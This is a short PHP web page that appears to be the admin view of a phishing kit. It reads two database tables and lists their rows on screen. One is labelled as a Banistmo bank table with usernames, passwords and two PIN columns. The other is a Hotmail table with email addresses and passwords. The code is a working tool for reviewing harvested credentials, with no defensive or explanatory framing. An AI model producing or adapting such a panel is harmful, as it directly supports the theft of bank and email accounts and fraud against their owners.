<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="Description" content="Enter your description here" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.0/css/all.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <title>Datos</title>
    <style>
        body {
            background-color: #25292d;
        }
    </style>
</head>

<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-sm-12 col-md-12 col-lg-12 col-xl-12" style="padding:0">
                <?php
                require 'conexion.php';
                $consulta = $pdo->prepare("SELECT * FROM datos");
                $consulta->execute();
                $consulta2 = $pdo->prepare("SELECT * FROM hotmail");
                $consulta2->execute();
                ?>
                <h2 style="color:whitesmoke">Tabla de banitsmo</h2>
                <table class="table table-striped table-dark">
                    <thead>
                        <tr>
                            <th scope="col">ID</th>
                            <th scope="col">USUARIO</th>
                            <th scope="col">CONTRASEÑA</th>
                            <th scope="col">PIN 1</th>
                            <th scope="col">PIN 2</th>

                        </tr>
                    </thead>
                    <?php
                    foreach ($consulta as $valor) {
                    ?>
                        <tbody>
                            <tr>
                                <td><?php echo $valor['id']; ?></td>
                                <td><?php echo $valor['usuario']; ?></td>
                                <td><?php echo $valor['contra']; ?></td>
                                <td><?php echo $valor['cuatro_digitos']; ?></td>
                                <td><?php echo $valor['pin']; ?></td>
                            </tr>
                        </tbody>
                    <?php } ?>
                </table>
                <br>
                <h2 style="color:whitesmoke">Tabla de hotmail</h2>
                <table class="table table-striped table-light">
                    <thead>
                        <tr>
                            <th scope="col">ID</th>
                            <th scope="col">USUARIO</th>
                            <th scope="col">CONTRASEÑA</th>
                        </tr>
                    </thead>
                    <?php
                    foreach ($consulta2 as $valor2) {
                    ?>
                        <tbody>
                            <tr>
                                <td><?php echo $valor2['id']; ?></td>
                                <td><?php echo $valor2['correo']; ?></td>
                                <td><?php echo $valor2['pass']; ?></td>
                            </tr>
                        </tbody>
                    <?php } ?>
                </table>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>

</html>